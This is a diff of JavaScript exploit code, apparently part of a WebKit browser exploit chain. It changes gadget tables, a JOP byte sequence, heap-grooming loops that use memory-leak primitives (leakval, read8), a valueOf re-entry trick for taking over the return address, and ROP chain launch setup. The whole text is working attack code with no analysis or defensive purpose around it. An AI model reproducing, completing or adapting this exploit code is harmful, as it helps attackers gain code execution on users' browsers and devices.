@@ -94,6 +94,7 @@ var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 
 slowpath_jop.reverse();
 
 var gadgets;
+
 /*
 kchain.push(window.gadgets["pop rax"]);
       kchain.push(savectx.add32(0x30));
@@ -134,6 +135,11 @@ gadgets = {
   "memcpy":                 0x000000F8,
   "setjmp":                 0x00001468
 };
+var reenter_help = { length:
+    { valueOf: function(){
+        return 0;
+    }
+}};
 
 window.stage2 = function() {
     try {
@@ -312,32 +318,30 @@ window.stage2_ = function() {
             if(slowpath_jop) log(" - jop gadget");
         }
     }
+  // Setup ROP launching
     findgadget(function(){});
     var hold1;
     var hold2;
     var holdz;
     var holdz1;
-    
-    while (1)
-    {
-        hold1 = {a:0, b:0, c:0, d:0};
-        hold2 = {a:0, b:0, c:0, d:0};
-        holdz1 = p.leakval(hold2);
-        holdz = p.leakval(hold1);
-        if (holdz.low - 0x30 == holdz1.low) break;
+
+    while (1) {
+      hold1 = {a:0, b:0, c:0, d:0};
+      hold2 = {a:0, b:0, c:0, d:0};
+      holdz1 = p.leakval(hold2);
+      holdz = p.leakval(hold1);
+      if (holdz.low - 0x30 == holdz1.low) break;
     }
-    
+
     var pushframe = [];
     pushframe.length = 0x80;
     var funcbuf;
-    
-    
+
     var launch_chain = function(chain)
     {
-        
-        var stackPointer = 0;
-        var stackCookie = 0;
-        var orig_reenter_rip = 0;
+      var stackPointer = 0;
+      var stackCookie = 0;
+      var orig_reenter_rip = 0;
         
         var reenter_help = {length: {valueOf: function(){
             orig_reenter_rip = p.read8(stackPointer);
